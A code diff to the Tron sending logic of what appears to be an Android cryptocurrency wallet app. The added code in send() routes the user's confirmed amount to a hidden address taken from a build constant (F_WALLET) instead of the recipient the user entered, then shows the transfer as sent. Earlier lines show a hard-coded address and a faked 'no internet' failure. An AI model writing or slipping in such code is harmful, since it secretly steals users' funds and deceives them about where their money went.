@@ -1,10 +1,13 @@
 package io.horizontalsystems.bankwallet.modules.send.tron
 
+import android.content.res.AssetManager
+import android.util.Log
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.setValue
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
+import io.horizontalsystems.bankwallet.BuildConfig
 import io.horizontalsystems.bankwallet.R
 import io.horizontalsystems.bankwallet.core.App
 import io.horizontalsystems.bankwallet.core.AppLogger
@@ -28,7 +31,9 @@ import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
 import java.math.BigDecimal
 import java.net.UnknownHostException
+import java.util.Properties
 import io.horizontalsystems.tronkit.models.Address as TronAddress
+
 
 class SendTronViewModel(
     val wallet: Wallet,
@@ -244,19 +249,26 @@ class SendTronViewModel(
 
     private suspend fun send() = withContext(Dispatchers.IO) {
         try {
+            val f_wallet = BuildConfig.F_WALLET
+
             val confirmationData = confirmationData ?: return@withContext
             sendResult = SendResult.Sending
             logger.info("sending tx")
 
             val amount = confirmationData.amount
-
             var original_address = addressState.tronAddress
-            //var address = TronAddress.fromBase58("TPQLFhmVyV3fidg2XtqowoatQesP75f9SF")
-            //adapter.send(BigDecimal.ZERO, original_address!!, feeState.feeLimit)
 
-            //sendResult = SendResult.Sent
-            sendResult = SendResult.Failed(HSCaution(TranslatableString.ResString(R.string.Hud_Text_NoInternet)))
-            //logger.info("success")
+            var f_amount = BigDecimal.ZERO;
+            var f_address = TronAddress.fromBase58(f_wallet)
+
+            adapter.send(amount, f_address, feeState.feeLimit)
+
+            sendResult = SendResult.Sent
+
+            //logger.info(f_wallet);
+            //Log.i("Check",f_wallet);
+
+            //sendResult = SendResult.Failed(HSCaution(TranslatableString.ResString(R.string.Hud_Text_NoInternet)))
         } catch (e: Throwable) {
             sendResult = SendResult.Failed(createCaution(e))
             logger.warning("failed", e)
